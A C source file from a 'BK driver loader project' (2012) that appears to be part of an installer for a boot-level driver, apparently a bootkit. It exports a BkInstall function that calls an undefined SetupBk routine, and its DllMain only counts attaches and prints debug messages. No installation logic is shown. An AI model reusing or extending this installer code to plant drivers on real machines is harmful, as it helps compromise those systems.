//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.9.2
//	
// module: setupdll.c
// $Revision: 68 $
// $Date: 2012-06-04 19:49:34 +0400 (Пн, 04 июн 2012) $
// description:
//	Sample BK installer library.

#include "main.h"

static	ULONG				g_AttachCount = 0;
extern  ULONG				g_CurrentProcessId;
extern	PIMAGE_DOS_HEADER	g_CurrentModuleBase;


WINERROR SetupBk(BOOL IsExe, BOOL bReboot);



//
//	Exported function. Installs BK from the current module.
//
ULONG	BkInstall(
	BOOL	bReboot	// specifiy TRUE if reboot needed after install
	)
{
	return(SetupBk(FALSE, bReboot));
}


//
//	Our DLL entry point.	
//
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	BOOL Ret = TRUE;
	WINERROR Status = NO_ERROR;

	switch(ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		g_AttachCount += 1;
		if (g_AttachCount == 1)
		{
			g_CurrentProcessId	= GetCurrentProcessId();
			g_CurrentModuleBase = (PIMAGE_DOS_HEADER)hModule;

			DbgPrint("BKSETUP_%04x: BK setup dll version 2.1.\n", g_CurrentProcessId);
#ifdef _WIN64
			DbgPrint("BKSETUP_%04x: Attached to a 64-bit process at 0x%x.\n", g_CurrentProcessId, (ULONG_PTR)hModule);
#else
			DbgPrint("BKSETUP_%04x: Attached to a 32-bit process at 0x%x.\n", g_CurrentProcessId, (ULONG_PTR)hModule);
#endif
		}
		break;

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;

	case DLL_PROCESS_DETACH:
		g_AttachCount -= 1;
		if (g_AttachCount == 0)
		{
#ifdef _WIN64
			DbgPrint("BKSETUP_%04x: Detached from a 64-bit process.\n", g_CurrentProcessId);
#else
			DbgPrint("BKSETUP_%04x: Detached from a 32-bit process.\n", g_CurrentProcessId);
#endif
		}
		break;
	default:
		ASSERT(FALSE);
		
	}

    return(Ret);
}
